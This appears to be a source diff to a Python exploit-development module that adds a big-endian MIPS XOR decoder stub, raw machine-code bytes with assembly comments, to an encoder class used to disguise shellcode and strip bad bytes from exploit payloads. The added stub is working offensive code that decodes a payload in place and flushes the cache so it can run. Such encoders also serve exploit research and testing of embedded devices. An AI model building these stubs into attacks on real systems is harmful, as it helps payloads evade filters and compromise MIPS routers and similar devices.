@@ -7,6 +7,8 @@ from ..common.support import BigEndian,LittleEndian
 from ..common.support import Logging
 
 class MipsXorEncoder(XorEncoder):
+    """An XOR encoder for the MIPS CPU archictecture.  Supports big endian and small endian.
+    """
     MAX_ATTEMPTS=10
     decoders={}
     decoders[LittleEndian] = string.join([ 
@@ -40,7 +42,38 @@ class MipsXorEncoder(XorEncoder):
         "\x46\x10\x02\x24",    # li v0,4166
         "\x0c\x54\x4a\x01"     # syscall   0x52950
         ],'')
-    
+
+    decoders[BigEndian] = string.join([ 
+        "\x24\x0eSIZ1SIZ2",    # li	t6,-5
+        "\x01\xc0\x70\x27",    # nor	t6,t6,zero
+        "\x24\x0b\xff\xa3",    # li	t3,-93
+        "\x01\xce\x40\x26",    # xor	t0,t6,t6
+        "\x21\x08\xff\xff",    # addi	t0,t0,-1
+        "\x05\x10\xff\xff",    # bltzal	t0,14 <next>
+        "\x28\x08\x82\x82",    # slti	t0,zero,-32126
+        "\x23\xfd\xff\xe2",    # addi	sp,ra,-30
+        "\x01\x60\x58\x27",    # nor	t3,t3,zero
+        "\x03\xeb\xc8\x21",    # addu	t9,ra,t3
+        "\x28\x17\x82\x82",    # slti	s7,zero,-32126
+        "\x8f\x31\xff\xfc",    # lw	s1,-4(t9)
+        "\x24\x0c\xff\xfb",    # li	t4,-5
+        "\x01\x80\x60\x27",    # nor	t4,t4,zero
+        "\x21\x8f\xff\xfd",    # addi	t7,t4,-3
+        "\x8f\x28\xff\xfc",    # lw	t0,-4(t9)
+        "\x02\xef\xb8\x21",    # addu	s7,s7,t7
+        "\x01\x11\x18\x26",    # xor	v1,t0,s1
+        "\x02\xee\xf0\x2b",    # sltu	s8,s7,t6
+        "\xaf\x23\xff\xfc",    # sw	v1,-4(t9)
+        "\x14\x1e\xff\xfa",    # bne	zero,s8,3c <loop>
+        "\x03\x2c\xc8\x21",    # addu	t9,t9,t4
+        "\x21\x86\xff\xfd",    # addi	a2,t4,-3
+        "\xaf\xa6\xff\xf8",    # sw	a2,-8(sp)
+        "\x01\xce\x28\x26",    # xor	a1,t6,t6
+        "\xaf\xa5\xff\xfc",    # sw	a1,-4(sp)
+        "\x27\xa4\xff\xf8",    # addiu	a0,sp,-8
+        "\x24\x02\x10\x46",    # li	v0,4166
+        "\x01\x4a\x54\x0c"    # syscall	0x52950
+        ],'') 
     def __has_badchars__(self,data,badchars):
         badchar_list=[]
         for char in badchars:
